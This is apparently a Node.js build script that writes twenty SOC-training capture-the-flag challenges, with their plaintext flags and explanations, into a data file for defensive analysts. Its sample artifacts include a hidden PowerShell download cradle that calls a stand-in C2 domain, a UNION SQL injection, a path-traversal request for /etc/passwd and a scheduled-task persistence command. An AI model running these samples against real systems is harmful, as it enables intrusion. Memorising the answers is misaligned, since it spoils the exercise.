import { writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
const sha = (s) => createHash("sha256").update(s).digest("hex");

// catName lookup
const CATS = {
  log:"Log Analysis", net:"Network Forensics", web:"Web Exploitation",
  crypto:"Encoding & Crypto", mal:"Malware Triage", cloud:"Cloud Security",
  id:"Identity", osint:"Recon & OSINT"
};

// Author challenges with PLAINTEXT flags. Hashes are computed; plaintext is dropped.
const C = [
{id:"ctf-01",cat:"crypto",diff:"easy",points:50,title:"Base64 Is Not Encryption",
 prompt:"A junior analyst found this string in a config file and thinks it is encrypted. Decode it to recover the flag.",
 artifact:"QlZITntiNjRfaXNfbm90X2VuY3J5cHRpb259",
 flag:"BVHN{b64_is_not_encryption}",
 hints:["Base64 uses A-Z, a-z, 0-9, + and /.","Use CyberChef From Base64, or `echo ... | base64 -d`."],
 explain:"Base64 is encoding, not encryption. Anyone can reverse it. Never treat it as a secret.",cysa:["SO"]},

{id:"ctf-02",cat:"crypto",diff:"easy",points:50,title:"Hex Dump",
 prompt:"This value was pulled from a packet payload. Convert the hex to ASCII.",
 artifact:"42 56 48 4e 7b 68 65 78 5f 64 75 6d 70 5f 64 65 63 6f 64 65 64 7d",
 flag:"BVHN{hex_dump_decoded}",
 hints:["Each pair of hex digits is one byte.","0x42 is the letter B."],
 explain:"Reading hex to ASCII is a daily SOC task when inspecting payloads and memory.",cysa:["SO"]},

{id:"ctf-03",cat:"crypto",diff:"easy",points:50,title:"Caesar Salad",
 prompt:"An attacker left a note using a simple letter-rotation cipher. Recover the original.",
 artifact:"OIUA{ebg13_pnrfne_fnynq}",
 flag:"BVHN{rot13_caesar_salad}",
 hints:["The brand prefix should read BVHN. How far is O from B?","ROT13 rotates each letter 13 places."],
 explain:"ROT13 is a Caesar cipher with shift 13. Trivial to break, still seen in low-effort obfuscation.",cysa:["SO"]},

{id:"ctf-04",cat:"log",diff:"easy",points:50,title:"Who Is Knocking",
 prompt:"From these Windows 4625 failures, identify the single source IP responsible for the brute force. Flag is BVHN{the_ip}.",
 artifact:[
 "02:11:03 EventID=4625 User=Administrator src=203.0.113.66 Status=0xC000006A",
 "02:11:04 EventID=4625 User=Administrator src=198.51.100.7 Status=0xC000006A",
 "02:11:05 EventID=4625 User=Administrator src=203.0.113.66 Status=0xC000006A",
 "02:11:06 EventID=4625 User=Administrator src=203.0.113.66 Status=0xC000006A",
 "02:11:07 EventID=4625 User=jsmith        src=10.20.9.2     Status=0xC000006A",
 "02:11:08 EventID=4625 User=Administrator src=203.0.113.66 Status=0xC000006A",
 "02:11:09 EventID=4625 User=Administrator src=203.0.113.66 Status=0xC000006A"].join("\n"),
 flag:"BVHN{203.0.113.66}",
 hints:["Count failures per source IP.","Internal 10.x noise is a distractor."],
 explain:"Brute force shows many failures from one external source at machine speed.",cysa:["SO"]},

{id:"ctf-05",cat:"log",diff:"medium",points:100,title:"The One That Got Through",
 prompt:"After the failures, one account authenticated successfully. Name the account. Flag is BVHN{account}.",
 artifact:[
 "02:11:08 EventID=4625 User=Administrator src=203.0.113.66",
 "02:11:40 EventID=4625 User=svc_backup    src=203.0.113.66",
 "02:11:55 EventID=4624 User=svc_backup    src=203.0.113.66  LogonType=10",
 "02:12:01 EventID=4625 User=Administrator src=203.0.113.66"].join("\n"),
 flag:"BVHN{svc_backup}",
 hints:["4624 is a successful logon. 4625 is a failure.","Find the 4624 and read its User field."],
 explain:"Service accounts are prime targets. The single 4624 is the moment of compromise.",cysa:["SO","IR"]},

{id:"ctf-06",cat:"log",diff:"medium",points:100,title:"Time of Compromise",
 prompt:"Report the exact UTC timestamp of the successful intrusion logon. Flag is BVHN{timestamp}.",
 artifact:[
 "2026-03-04T02:17:11Z EventID=4625 User=rgarcia src=185.220.101.45",
 "2026-03-04T02:17:29Z EventID=4625 User=rgarcia src=185.220.101.45",
 "2026-03-04T02:17:43Z EventID=4624 User=rgarcia src=185.220.101.45 LogonType=10",
 "2026-03-04T02:18:02Z EventID=4672 User=rgarcia"].join("\n"),
 flag:"BVHN{2026-03-04T02:17:43Z}",
 hints:["Look for the 4624 success.","Copy the timestamp exactly, including the Z."],
 explain:"Precise timestamps anchor an incident timeline and the post-mortem.",cysa:["IR","RC"]},

{id:"ctf-07",cat:"net",diff:"medium",points:100,title:"Find the Beacon",
 prompt:"A host calls home on a fixed interval. Report the interval in seconds. Flag is BVHN{seconds}.",
 artifact:[
 "12:00:00 ALLOW 10.20.4.12 -> 91.219.236.18:8443 bytes=1180",
 "12:01:00 ALLOW 10.20.4.12 -> 91.219.236.18:8443 bytes=1192",
 "12:02:00 ALLOW 10.20.4.12 -> 91.219.236.18:8443 bytes=1175",
 "12:03:00 ALLOW 10.20.4.12 -> 91.219.236.18:8443 bytes=1188"].join("\n"),
 flag:"BVHN{60}",
 hints:["Subtract consecutive timestamps to the same destination.","The gap is constant."],
 explain:"Beacon detection is about timing regularity, not payload signatures.",cysa:["SO"]},

{id:"ctf-08",cat:"net",diff:"easy",points:50,title:"Wrong Door",
 prompt:"Using the same beacon traffic, what destination port is the C2 using? Flag is BVHN{port}.",
 artifact:"12:00:00 ALLOW 10.20.4.12 -> 91.219.236.18:8443 bytes=1180 proto=TCP",
 flag:"BVHN{8443}",
 hints:["The port follows the colon after the destination IP."],
 explain:"8443 mimics HTTPS to blend in. Unusual ports paired with regularity are suspicious.",cysa:["SO"]},

{id:"ctf-09",cat:"net",diff:"medium",points:100,title:"Count the Loss",
 prompt:"Sum the bytes exfiltrated to the single external host and report the total in whole megabytes. Flag is BVHN{MB}.",
 artifact:[
 "ALLOW 10.20.6.21 -> 45.83.220.9:443 bytes=104857600",
 "ALLOW 10.20.6.21 -> 45.83.220.9:443 bytes=209715200",
 "ALLOW 10.20.6.21 -> 45.83.220.9:443 bytes=52428800"].join("\n"),
 flag:"BVHN{350}",
 hints:["1 MB is 1048576 bytes.","Add the three transfers, then divide by 1048576."],
 explain:"100 + 200 + 50 equals 350 MB. Volume and destination are the exfil signals over TLS.",cysa:["IR"]},

{id:"ctf-10",cat:"web",diff:"medium",points:100,title:"Union of Concern",
 prompt:"This request is a SQL injection. Which database table did the attacker target? Flag is BVHN{table}.",
 artifact:`203.0.113.9 - - [10/Mar/2026:14:22:07] "GET /search?q=widget'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 8841`,
 flag:"BVHN{users}",
 hints:["Read the part after FROM.","The payload is URL-encoded. %20 is a space."],
 explain:"UNION-based SQLi pulls data from another table. Here the attacker dumped the users table.",cysa:["SO","VM"]},

{id:"ctf-11",cat:"web",diff:"medium",points:100,title:"Climbing Out",
 prompt:"Identify the sensitive file this path-traversal attempt tried to read. Flag is BVHN{/path/to/file}.",
 artifact:`198.51.100.23 - - [10/Mar/2026:14:31:55] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1903`,
 flag:"BVHN{/etc/passwd}",
 hints:["The ../ sequences climb directories.","Report the final absolute path with a leading slash."],
 explain:"Path traversal escapes the web root to read system files such as /etc/passwd.",cysa:["SO","VM"]},

{id:"ctf-12",cat:"web",diff:"easy",points:50,title:"Name the Tool",
 prompt:"A scanner hammered the app. Name the tool from its User-Agent. Flag is BVHN{toolname}.",
 artifact:`45.146.164.110 - - [10/Mar/2026:15:02:11] "GET /login?id=1 HTTP/1.1" 500 12 "-" "sqlmap/1.7.11#stable (https://sqlmap.org)"`,
 flag:"BVHN{sqlmap}",
 hints:["The User-Agent is the last quoted field.","Report just the tool name, no version."],
 explain:"Tools announce themselves in the User-Agent unless changed. sqlmap automates SQLi.",cysa:["SO"]},

{id:"ctf-13",cat:"mal",diff:"medium",points:100,title:"Cradle Call",
 prompt:"Extract the command-and-control domain from this download cradle. Flag is BVHN{domain}.",
 artifact:`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://cdn-update.evilcorp-c2.net/a.ps1')"`,
 flag:"BVHN{evilcorp-c2.net}",
 hints:["Find the URL inside DownloadString.","Report the registrable domain, not the subdomain or path."],
 explain:"The registrable domain is evilcorp-c2.net. The cdn-update label is a subdomain meant to look benign.",cysa:["SO","IR"]},

{id:"ctf-14",cat:"mal",diff:"medium",points:100,title:"Sticky Fingers",
 prompt:"Name the persistence technique used here in two words with an underscore. Flag is BVHN{technique}.",
 artifact:`schtasks /create /sc minute /mo 5 /tn "OneDriveSync" /tr "C:\\Users\\Public\\od.exe" /ru SYSTEM`,
 flag:"BVHN{scheduled_task}",
 hints:["The command is schtasks.","It registers something that runs every 5 minutes."],
 explain:"A scheduled task re-launching a binary every few minutes is classic persistence (ATT&CK T1053).",cysa:["SO","IR"]},

{id:"ctf-15",cat:"mal",diff:"easy",points:50,title:"Refang It",
 prompt:"This indicator was defanged for safe sharing. Refang it and report the payload file name. Flag is BVHN{filename}.",
 artifact:"hxxp://185[.]220[.]101[.]45/dropper/payload[.]exe",
 flag:"BVHN{payload.exe}",
 hints:["Defanging replaces . with [.] and http with hxxp.","Report only the file name at the end."],
 explain:"Analysts defang IOCs so nobody clicks them. Refanging restores the real value for tooling.",cysa:["RC"]},

{id:"ctf-16",cat:"cloud",diff:"medium",points:100,title:"Left the Door Open",
 prompt:"This CloudTrail event exposed data. Name the bucket that was made public. Flag is BVHN{bucket-name}.",
 artifact:`{"eventName":"PutBucketAcl","requestParameters":{"bucketName":"bvhn-phi-exports-7g2k","x-amz-acl":"public-read"},"sourceIPAddress":"185.220.101.45"}`,
 flag:"BVHN{bvhn-phi-exports-7g2k}",
 hints:["Look at requestParameters.bucketName.","public-read on a PHI bucket is the breach."],
 explain:"A single PutBucketAcl set to public-read can expose regulated data instantly.",cysa:["SO","IR"]},

{id:"ctf-17",cat:"cloud",diff:"medium",points:100,title:"No Second Factor",
 prompt:"A console login bypassed MFA. Report the source IP of that login. Flag is BVHN{ip}.",
 artifact:`{"eventName":"ConsoleLogin","additionalEventData":{"MFAUsed":"No"},"responseElements":{"ConsoleLogin":"Success"},"sourceIPAddress":"185.220.101.45","geo":"Moscow, RU"}`,
 flag:"BVHN{185.220.101.45}",
 hints:["MFAUsed is No and the login Succeeded.","Report sourceIPAddress."],
 explain:"A successful root-style login without MFA from a hostile geo is a critical finding.",cysa:["SO","IR"]},

{id:"ctf-18",cat:"id",diff:"hard",points:150,title:"Impossible Travel",
 prompt:"Two successful sign-ins for one user are physically impossible given the time gap. Name the user. Flag is BVHN{username}.",
 artifact:[
 "08:02:11 SignIn user=rgarcia geo=Houston, US ip=10.20.4.12 result=Success",
 "08:09:44 SignIn user=rgarcia geo=Lagos, NG  ip=102.89.33.7 result=Success",
 "08:14:20 SignIn user=achen   geo=Houston, US ip=10.20.6.44 result=Success"].join("\n"),
 flag:"BVHN{rgarcia}",
 hints:["Find one user signing in from two distant places minutes apart.","Houston to Lagos in 7 minutes is impossible."],
 explain:"Impossible travel is a strong token-theft or shared-credential signal.",cysa:["SO","IR"]},

{id:"ctf-19",cat:"id",diff:"hard",points:150,title:"Risky Consent",
 prompt:"A malicious OAuth app was consented. Name the scope that lets it read the victim mailbox. Flag is BVHN{Scope}.",
 artifact:`Consent: app="PDF-Helper-Pro" scopes="User.Read,Mail.Read,offline_access" user=rgarcia ip=185.220.101.45`,
 flag:"BVHN{Mail.Read}",
 hints:["One scope reads mail. One keeps a refresh token alive.","Report the mail-reading scope exactly as written."],
 explain:"Mail.Read lets the app harvest mail. offline_access keeps access after password reset, which is why token revocation matters.",cysa:["IR","RC"]},

{id:"ctf-20",cat:"osint",diff:"hard",points:150,title:"Decode Chain",
 prompt:"Decode this base64, then read the recovered URL and report the value of its token parameter. Flag is BVHN{tokenvalue}.",
 artifact:"aHR0cHM6Ly9wb3J0YWwuYnZobi5vcmcvcmVzZXQ/dG9rZW49aDRjazNk",
 flag:"BVHN{h4ck3d}",
 hints:["From Base64 first.","The URL has ?token=... at the end."],
 explain:"Real investigations chain decoders. Base64 reveals a password-reset URL leaking a token value.",cysa:["SO"]}
];

// Build output, dropping plaintext flags.
const out = C.map(c => ({
  id:c.id, cat:c.cat, catName:CATS[c.cat], title:c.title, diff:c.diff, points:c.points,
  prompt:c.prompt, artifact:c.artifact, format:"BVHN{...}", flagHash:sha(c.flag.trim()),
  hints:c.hints, explain:c.explain, cysa:c.cysa
}));

const banner = `/* SOC Range :: ctf.data.js  (generated by build, do not hand-edit flags)
 * 20 capture-the-flag challenges. Flags are stored only as SHA-256 hashes,
 * so the answers are not present in this file. The client hashes the typed
 * flag and compares. Categories: ${Object.values(CATS).join(", ")}.
 */`;
const body = `(function(){"use strict";var SOC=(self.SOC=self.SOC||{});SOC.ctf=${JSON.stringify(out,null,2)};})();\n`;
writeFileSync("js/ctf.data.js", banner+"\n"+body);
console.log("Wrote js/ctf.data.js with", out.length, "challenges. Total points:", out.reduce((a,c)=>a+c.points,0));
// sanity: ensure all flags verify
import { createHash as ch } from "node:crypto";
let ok=true;
C.forEach(c=>{ if(ch("sha256").update(c.flag.trim()).digest("hex")!==out.find(o=>o.id===c.id).flagHash){ok=false;console.log("HASH MISMATCH",c.id);} });
console.log("flag hash self-check:", ok?"PASS":"FAIL");
